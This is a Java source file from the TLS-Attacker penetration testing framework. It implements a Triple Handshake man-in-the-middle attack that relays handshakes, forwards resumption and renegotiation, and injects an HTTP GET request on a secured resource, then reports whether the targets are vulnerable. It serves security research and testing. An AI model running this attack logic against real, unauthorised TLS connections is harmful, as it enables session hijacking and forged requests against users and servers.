/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.TripleHandshakeAttackCommandConfig;
import de.rub.nds.tlsattacker.attacks.mitm.MitMWorkflowExecutor;
import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeInitialWorkflowConfiguration;
import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeWorkflowConfiguration;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
import de.rub.nds.tlsattacker.tls.config.ServerCommandConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.io.IOException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Triple Handshake attack against a target server using a client
 * with a legitimate certificate
 * 
 * @author Philip Riese <philip.riese@rub.de>
 */
public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(TripleHandshakeAttack.class);

    public TripleHandshakeAttack(TripleHandshakeAttackCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler clientConfigHandler) {
	// create server objects
	ServerCommandConfig serverCommandConfig = new ServerCommandConfig();
	serverCommandConfig.setPort(config.getPort());
	serverCommandConfig.setCipherSuites(config.getCipherSuites());
	serverCommandConfig.setKeystore(config.getKeystore());
	serverCommandConfig.setPassword(config.getPassword());
	serverCommandConfig.setAlias(config.getAlias());
	serverCommandConfig.setWorkflowTraceType(config.getWorkflowTraceType());
	serverCommandConfig.setMaxTransportResponseWait(config.getMaxTransportResponseWait());

	GeneralConfig generalConfig = new GeneralConfig();
	ConfigHandler serverConfigHandler = ConfigHandlerFactory.createConfigHandler("server");
	serverConfigHandler.initializeGeneralConfig(generalConfig);
	TransportHandler serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
	TlsContext serverTlsContext = serverConfigHandler.initializeTlsContext(serverCommandConfig);

	// create client objects
	TransportHandler clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);
	TlsContext clientTlsContext = clientConfigHandler.initializeTlsContext(config);

	// load workflow to synchronize the the initial handshake into the
	// tlsContext objects
	TripleHandshakeInitialWorkflowConfiguration clientwf = new TripleHandshakeInitialWorkflowConfiguration(
		clientTlsContext, config);
	clientwf.createWorkflow();

	TripleHandshakeInitialWorkflowConfiguration serverwf = new TripleHandshakeInitialWorkflowConfiguration(
		serverTlsContext, config);
	serverwf.createWorkflow();

	// no manual modification necessary
	boolean mod = false;

	MitMWorkflowExecutor mitmWorkflowExecutor = new MitMWorkflowExecutor(clientTransportHandler,
		serverTransportHandler, clientTlsContext, serverTlsContext, mod);

	mitmWorkflowExecutor.executeWorkflow();

	clientTransportHandler.closeConnection();
	serverTransportHandler.closeConnection();

	// handle client software, which initiates multiple connections
	if (config.isPause()) {
	    System.out.println("Press a Button to continue, if Browser has terminated loading.");
	    try {
		System.in.read();
	    } catch (IOException e) {
		System.err.println(e);
	    }
	}

	// load the path to a secured resource
	clientTlsContext.setCertSecure(config.getCertSecure());

	// load workflow to forward the the session resumption and renegotiation
	// as well as to inject a HTTP GET request on a secured resource
	TripleHandshakeWorkflowConfiguration clientwf2 = new TripleHandshakeWorkflowConfiguration(clientTlsContext,
		config);
	clientwf2.createWorkflow();

	TripleHandshakeWorkflowConfiguration serverwf2 = new TripleHandshakeWorkflowConfiguration(serverTlsContext,
		config);
	serverwf2.createWorkflow();

	serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
	clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);

	MitMWorkflowExecutor mitmWorkflowExecutor2 = new MitMWorkflowExecutor(clientTransportHandler,
		serverTransportHandler, clientTlsContext, serverTlsContext, mod);

	mitmWorkflowExecutor2.executeWorkflow();

	LOGGER.info("The renegotiation was not aborted, so the server and the client are vulnerable");

	clientTransportHandler.closeConnection();
	serverTransportHandler.closeConnection();

    }
}
